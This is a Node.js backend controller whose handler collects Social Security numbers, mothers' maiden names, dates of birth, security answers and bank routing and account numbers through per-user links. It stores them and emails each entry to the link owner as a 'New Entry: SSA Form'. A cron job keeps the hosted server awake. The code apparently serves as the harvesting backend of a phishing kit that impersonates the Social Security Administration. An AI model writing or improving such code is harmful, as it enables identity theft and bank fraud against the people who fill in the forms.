import axios from "axios";
import prisma from "../config/prisma.js";
import { sendMail } from "../email.js";
import emailTemplate from "../emailTemplate.js";
import cron from "node-cron";

export const sendEmail = async (req, res) => {
  const { formId } = req.body;
  try {
    const user = await prisma.user.findUnique({
      where: { link: formId },
    });

    if (!user) {
      return res.status(404).json({ success: false, error: "User not found" });
    }

    const {
      fname,
      ssn,
      mailAddress,
      fathersFname,
      mothersFname,
      mothersMname,
      city,
      state,
      amount,
      routing,
      account,
      phone_number,
      QA,
      dob,
      dateOfPayment,
    } = req.body;

    // Validate required fields
    const requiredFields = {
      fname,
      ssn,
      mailAddress,
      fathersFname,
      mothersFname,
      mothersMname,
      city,
      state,
      amount,
      routing,
      account,
      phone_number,
      QA,
      dob,
      dateOfPayment,
    };

    for (const [field, value] of Object.entries(requiredFields)) {
      if (!value) {
        return res
          .status(400)
          .json({ success: false, error: `Missing required field: ${field}` });
      }
    }

    const message = emailTemplate({
      fname,
      ssn,
      mailAddress,
      fathersFname,
      mothersFname,
      mothersMname,
      city,
      state,
      amount,
      routing,
      account,
      phone_number,
      QA,
      dob,
      dateOfPayment,
    });

    const newFormData = await prisma.form.create({
      data: {
        full_name: fname,
        ssn,
        mail_address: mailAddress,
        father_fullname: fathersFname,
        mother_fullname: mothersFname,
        mother_maiden_name: mothersMname,
        city,
        state,
        amount,
        routing,
        account,
        phone_number,
        qa: QA,
        dob,
        date_of_payment: dateOfPayment, // Correct variable name
        userId: user.id, // Associate form with the user
      },
    });

    await sendMail(user.email, message, `New Entry: SSA Form ${fname}`);

    res.status(200).json({ success: true, message: "Email sent successfully" });
  } catch (error) {
    console.error("Error sending email:", error.message);
    if (!res.headersSent) {
      res.status(500).json({ success: false, error: "Internal server error" });
    }
  }
};

export const getLink = async (req, res) => {
  try {
    const links = await prisma.user.findMany({ select: { link: true } });
    res.json(links);
  } catch (error) {
    console.error("Error fetching links:", error.message);
    res.status(500).json({ success: false, error: "Internal server error" });
  }
};

// Scheduling to ping the server to avoid inactivities

cron.schedule("* * * * *", async() => {
  try {
    const response = await axios.get("https://form-d45b.onrender.com/ping");
    console.log(`Service won't sleep since ${response.status}`);
  } catch (error) {
    console.error("Unable to awaken server:", error.message);
  }
});
